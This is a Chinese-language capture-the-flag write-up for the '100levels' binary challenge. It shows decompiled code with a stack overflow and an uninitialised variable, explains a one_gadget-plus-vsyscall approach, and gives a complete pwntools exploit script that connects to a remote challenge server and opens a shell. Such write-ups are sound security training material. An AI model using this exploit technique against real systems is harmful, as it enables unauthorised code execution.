# 100levels

## 来源
World of Attack & Defense


## 难度

3 / 10

## 保护

 ```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
 ```

## 简单描述

是提供一个乘法功能的游戏题目,题中也给出了system函数,题中出题是采用递归方式进行循环出题.

## vul

```c
//在出题功能函数中中存在堆栈溢出 
puts("===================================================="); 
  printf("Level %d\n", (unsigned int)a1);
  printf("Question: %d * %d = ? Answer:", v10, v9);
  read(0, &buf, 0x400uLL); //可以堆栈溢出
  v3 = strtol((const char *)&buf, 0LL, 10);
  return v3 == v8;
}
//在hint函数中,system的地址会储存在 rbu - 0x110处
 text:0000000000000D06                 push    rbp
.text:0000000000000D07                 mov     rbp, rsp
.text:0000000000000D0A                 sub     rsp, 110h
.text:0000000000000D11                 mov     rax, cs:system_ptr
.text:0000000000000D18                 mov     [rbp+var_110], rax ; system
.text:0000000000000D1F                 lea     rax, unk_20208C
.text:0000000000000D26                 mov     eax, [rax]
.text:0000000000000D28                 test    eax, eax
    
//而go函数中,system的位置恰好是v6变量的位置,且这两个函数都是在main函数中可以进行调用的 
  int v1; // ST0C_4
  __int64 v2; // [rsp+0h] [rbp-120h]
  __int64 v3; // [rsp+0h] [rbp-120h]
  int v4; // [rsp+8h] [rbp-118h]
  __int64 v5; // [rsp+10h] [rbp-110h]        //v5 在hint函数中是system的位置
  signed __int64 v6; // [rsp+10h] [rbp-110h] //v6 在hint函数中是system的位置
  signed __int64 v7; // [rsp+18h] [rbp-108h]
  __int64 v8; // [rsp+20h] [rbp-100h]

//注意v5和v6共用一个内存,所以v5和v6都是system位置的变量.
  puts("How many levels?");
  v2 = InputNum();
  if ( v2 > 0 ) //vul ,若v2小于等于0时,v5的值还是原堆栈中的值.
    v5 = v2;
  else
    puts("Coward");
  puts("Any more?");
  v3 = InputNum();
  v6 = v5 + v3; //加后读对自己本身赋值.
  if ( v6 > 0 )
  {
    if ( v6 <= 99 )
    {
      v7 = v6;
    }
```



## 知识点

stack overflow, vsyscall特性

## 思路

先执行hint函数,使system地址储存在rbp - 0x110处，输入v2的值为小于或等于0的数, 然后使v6 = v5 + v3为one_gadget, 再通过通过stack overflow使vsyscal中存在的ret使rsp滑到one_gadget,然后执行one_gadget get shell



## 利用

### 修改rbp - 0x110处为one_gadget

根据程序逻辑,先让rbp - 0x110处填充system地址,在go功能中,第一次输入0,使v5不会被覆盖,v5的值就是system地址,然后再通过v6 = v5 + v3修改rbp - 0x110处的值,第二次输入就是one_gadget与system在libc中的偏移了.

```python
	sla('Choice:\n', '2'); # full system addr in stack
	gadget = 0x4526a
	offset = gadget - lib.sym['system'] #计算偏移
	sla('Choice:\n', '1')
	sla('?\n', '0')
	sla('Any more?\n', str(offset)) #修改rbp - 0x110处为one_gadget
```

### 使用vsyscall中存在的ret使rsp跑到rbp - 0x110调用one_gadget

```python
for i in range(0, 99): #需要得答题 100次,到最后一次就上payload,因为根据栈结构的特性,最后一次是最先压入的存在的堆栈一出可以覆盖到调用函数的缓冲区里.
		ru('Question: ')
		a = int(ru(' * '))
		b = int(ru(' ='))
		sla('Answer:', str(a * b))

	vsyscall = 0xffffffffff600000 # vsyscall地址是固定不变的,这里存在的函数为gettimeofday,存在ret
	p = 'A' * 0x38 + p64(vsyscall) * 3
	#db()
	sa('Answer:', p)
```



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *

context.log_level='debug'
exeFile = '100levels'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "124.126.19.106"
remotePort = 56962

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():
	li(rl())
	sla('Choice:\n', '2'); # full system addr in stack
	gadget = 0x4526a
	offset = gadget - lib.sym['system']
	sla('Choice:\n', '1')
	sla('?\n', '0')
	sla('Any more?\n', str(offset))
	
	for i in range(0, 99):
		ru('Question: ')
		a = int(ru(' * '))
		b = int(ru(' ='))
		sla('Answer:', str(a * b))

	vsyscall = 0xffffffffff600000
	p = 'A' * 0x38 + p64(vsyscall) * 3
	#db()
	sa('Answer:', p)
	
	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

